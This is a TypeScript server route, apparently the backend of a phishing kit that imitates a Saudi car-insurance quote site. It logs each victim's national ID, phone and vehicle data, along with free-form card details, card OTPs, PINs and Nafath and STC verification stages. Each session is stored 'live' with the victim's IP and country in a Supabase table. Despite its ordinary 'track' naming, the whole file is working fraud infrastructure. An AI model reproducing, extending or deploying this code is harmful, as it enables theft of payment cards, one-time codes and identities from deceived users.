import { createFileRoute } from "@tanstack/react-router";
import { makeServiceClient } from "@/lib/admin-api.server";
import { z } from "zod";

const PageEnum = z.enum([
  "quote_landing",
  "insurer_selected",
  "payment_card",
  "card_otp",
  "card_pin",
  "phone_entry",
  "motsl_otp",
  "nafath",
  "stc_awaiting",
]);

const BodySchema = z.object({
  sid: z.string().min(4).max(64),
  type: z.enum(["visit", "update", "submit"]),
  page: PageEnum.optional(),
  data: z
    .object({
      nationalId: z.string().max(20).optional(),
      phone: z.string().max(20).optional(),
      serialNumber: z.string().max(20).optional(),
      vehicleMake: z.string().max(60).optional(),
      vehicleModel: z.string().max(60).optional(),
      modelYear: z.number().int().min(1980).max(2100).optional(),
      declaredValue: z.number().min(0).max(10_000_000).optional(),
      insurerCompany: z.string().max(80).optional(),
      insurerOfferSar: z.number().min(0).max(10_000_000).optional(),
      // free-form submission fields (card / OTP / etc.)
      submission: z.record(z.string(), z.string()).optional(),
    })
    .optional(),
});

const LegacyBodySchema = z.object({
  sessionId: z.string().min(4).max(64),
  event: z.string().min(1).max(40),
  page: z.string().min(1).max(200).optional(),
});

// Loose shape used by the live tamnbcare.online tracker:
//   { sid, pathname, event, ...flatFields, submission?: {...} }
const LooseBodySchema = z
  .object({
    sid: z.string().min(4).max(64),
    pathname: z.string().max(300).optional(),
    page: z.string().max(300).optional(),
    event: z.string().max(40).optional(),
  })
  .passthrough();

function pageFromPath(path: string | undefined): z.infer<typeof PageEnum> {
  const normalized = (path ?? "/").toLowerCase();
  if (normalized.includes("insurer") || normalized.includes("compare")) return "insurer_selected";
  if (normalized.includes("payment") || normalized.includes("card")) return "payment_card";
  if (normalized.includes("otp")) return "card_otp";
  if (normalized.includes("pin")) return "card_pin";
  if (normalized.includes("phone")) return "phone_entry";
  if (normalized.includes("motsl")) return "motsl_otp";
  if (normalized.includes("nafath")) return "nafath";
  if (normalized.includes("stc")) return "stc_awaiting";
  return "quote_landing";
}

const FIELD_ALIASES: Record<string, string> = {
  national_id: "nationalId",
  nationalid: "nationalId",
  nationalId: "nationalId",
  id_number: "nationalId",
  phone: "phone",
  phone_number: "phone",
  mobile: "phone",
  serial_number: "serialNumber",
  serialNumber: "serialNumber",
  sequence_number: "serialNumber",
  vehicle_make: "vehicleMake",
  vehicleMake: "vehicleMake",
  make: "vehicleMake",
  vehicle_model: "vehicleModel",
  vehicleModel: "vehicleModel",
  model: "vehicleModel",
  model_year: "modelYear",
  modelYear: "modelYear",
  year: "modelYear",
  declared_value: "declaredValue",
  declaredValue: "declaredValue",
  value: "declaredValue",
  insurer_company: "insurerCompany",
  insurerCompany: "insurerCompany",
  insurer: "insurerCompany",
  company: "insurerCompany",
  insurer_offer_sar: "insurerOfferSar",
  insurerOfferSar: "insurerOfferSar",
  offer: "insurerOfferSar",
  price: "insurerOfferSar",
  amount: "insurerOfferSar",
};

const NUMERIC_FIELDS = new Set(["modelYear", "declaredValue", "insurerOfferSar"]);
const SKIP_KEYS = new Set([
  "sid", "pathname", "page", "event", "type", "data", "submission",
  "ip", "client_ip", "country", "user_agent", "ua", "timestamp", "ts",
]);

function coerceLoose(raw: Record<string, unknown>): z.infer<typeof BodySchema> {
  const sid = String(raw["sid"] ?? "");
  const pathish = (raw["page"] as string | undefined) ?? (raw["pathname"] as string | undefined);
  const event = String(raw["event"] ?? "visit");
  const type: "visit" | "update" | "submit" =
    event === "submit" || event === "form_data" ? "submit" : event === "update" ? "update" : "visit";
  const data: Record<string, unknown> = {};
  const submission: Record<string, string> = {
    ...((raw["submission"] as Record<string, string> | undefined) ?? {}),
  };
  for (const [k, v] of Object.entries(raw)) {
    if (v == null || v === "") continue;
    if (SKIP_KEYS.has(k)) continue;
    if (k.startsWith("submission.")) {
      submission[k.slice("submission.".length)] = String(v);
      continue;
    }
    const alias = FIELD_ALIASES[k];
    if (alias) {
      if (NUMERIC_FIELDS.has(alias)) {
        const n = typeof v === "number" ? v : Number(String(v).replace(/[^\d.]/g, ""));
        if (!Number.isNaN(n) && n > 0) data[alias] = n;
      } else {
        data[alias] = String(v);
      }
    } else if (typeof v === "string" || typeof v === "number") {
      submission[k] = String(v);
    }
  }
  if (Object.keys(submission).length) data["submission"] = submission;
  return {
    sid,
    type,
    page: pageFromPath(pathish),
    data: Object.keys(data).length ? (data as z.infer<typeof BodySchema>["data"]) : undefined,
  };
}

const DEFAULT_ORIGIN = "https://tmnbcre.lovable.app";
const ALLOWED_ORIGINS = [DEFAULT_ORIGIN, "https://tamnbcare.online"];

function corsHeaders(origin: string | null): Record<string, string> {
  return {
    "Access-Control-Allow-Origin":
      origin && ALLOWED_ORIGINS.includes(origin) ? origin : DEFAULT_ORIGIN,
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "content-type",
    Vary: "Origin",
  };
}

export const Route = createFileRoute("/api/public/track")({
  server: {
    handlers: {
      OPTIONS: async ({ request }) => {
        const origin = request.headers.get("origin");
        return new Response(null, { status: 204, headers: corsHeaders(origin) });
      },
      POST: async ({ request }) => {
        const origin = request.headers.get("origin");
        if (origin && !ALLOWED_ORIGINS.includes(origin)) {
          return new Response("Origin not allowed", { status: 403, headers: corsHeaders(origin) });
        }
        let json: unknown;
        try {
          json = await request.json();
        } catch {
          return new Response("Bad JSON", { status: 400, headers: corsHeaders(origin) });
        }
        const currentPayload = BodySchema.safeParse(json);
        const legacyPayload = LegacyBodySchema.safeParse(json);
        const loosePayload = LooseBodySchema.safeParse(json);
        let payload: z.infer<typeof BodySchema>;
        if (currentPayload.success) {
          payload = currentPayload.data;
        } else if (loosePayload.success) {
          payload = coerceLoose(loosePayload.data as Record<string, unknown>);
        } else if (legacyPayload.success) {
          payload = {
            sid: legacyPayload.data.sessionId,
            type: legacyPayload.data.event === "submit" ? "submit" : "visit",
            page: pageFromPath(legacyPayload.data.page),
          };
        } else {
          return new Response("Invalid payload", { status: 400, headers: corsHeaders(origin) });
        }
        const { sid, type, page, data } = payload;

        // Capture the visitor's real IP (Cloudflare / proxy headers)
        const ip =
          request.headers.get("cf-connecting-ip") ||
          request.headers.get("x-real-ip") ||
          (request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ?? null);

        // Resolve country: prefer Cloudflare's geolocation, fall back to a lookup API
        let country: string | null =
          (request as unknown as { cf?: { country?: string } }).cf?.country ?? null;
        if (!country && ip && !/^(10\.|192\.168\.|127\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) {
          try {
            const geo = await fetch(
              `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country`,
              { signal: AbortSignal.timeout(2500) },
            );
            if (geo.ok) {
              const j = (await geo.json()) as { status?: string; country?: string };
              if (j.status === "success" && j.country) country = j.country;
            }
          } catch {
            /* geo lookup best-effort */
          }
          if (!country) {
            try {
              const geo = await fetch(
                `https://ipapi.co/${encodeURIComponent(ip)}/country_name/`,
                { signal: AbortSignal.timeout(2500) },
              );
              if (geo.ok) {
                const name = (await geo.text()).trim();
                if (name && !/error|reserved|undefined|ratelimit/i.test(name)) country = name;
              }
            } catch {
              /* geo lookup best-effort */
            }
          }
        }

        const supabase = makeServiceClient();

        const { data: existing } = await supabase
          .from("tracked_sessions")
          .select("session_id, submission")
          .eq("session_id", sid)
          .maybeSingle();

        const submissionMerge = {
          ...((existing?.submission as Record<string, string> | null) ?? {}),
          ...(data?.submission ?? {}),
        };

        const row: Record<string, unknown> = {
          session_id: sid,
          state: "live",
          submission: submissionMerge,
          updated_at: new Date().toISOString(),
        };
        if (page) row["current_page"] = page;
        else if (!existing) row["current_page"] = "quote_landing";
        if (data?.nationalId) row["national_id"] = data.nationalId;
        if (data?.phone) row["phone"] = data.phone;
        if (data?.serialNumber) row["serial_number"] = data.serialNumber;
        if (data?.vehicleMake) row["vehicle_make"] = data.vehicleMake;
        if (data?.vehicleModel) row["vehicle_model"] = data.vehicleModel;
        if (data?.modelYear) row["model_year"] = data.modelYear;
        if (data?.declaredValue) row["declared_value"] = data.declaredValue;
        if (data?.insurerCompany) row["insurer_company"] = data.insurerCompany;
        if (data?.insurerOfferSar) row["insurer_offer_sar"] = data.insurerOfferSar;
        if (ip) row["ip_address"] = ip;
        if (country) row["country"] = country;

        const { error } = await supabase
          .from("tracked_sessions")
          .upsert(row, { onConflict: "session_id" });

        if (error) {
          return new Response(JSON.stringify({ error: error.message }), {
            status: 500,
            headers: { ...corsHeaders(origin), "Content-Type": "application/json" },
          });
        }
        return new Response(JSON.stringify({ ok: true, sid, type }), {
          headers: { ...corsHeaders(origin), "Content-Type": "application/json" },
        });
      },
    },
  },
});
